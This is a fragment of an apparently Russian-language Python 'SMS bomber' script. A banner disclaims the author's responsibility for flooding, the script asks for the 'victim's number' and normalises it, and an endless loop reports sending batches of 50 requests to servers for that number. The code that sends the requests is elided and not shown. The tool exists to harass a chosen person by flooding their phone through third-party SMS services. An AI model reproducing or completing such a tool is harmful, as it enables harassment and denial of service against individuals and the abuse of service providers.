...
|                      ВНИМАНИЕ!                           |
| Автор бомбера не несёт ответственности за ваши действия! |
| Совершайте флуд СМС только на свой страх и риск, думая о |
| последствиях.                                            |
|                      HOMXTERM                            |
"""

print(banner)
_phone = input("Введите номер жертвы :  ")
if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] == '8':
    _phone = '7'+_phone[1:]
...
print("Бомбер запущен на номер  " + _phone)
iteration = 0
while True:
        ...
        print("Было отправлено 50 запросов на сервера с указанным номером!")
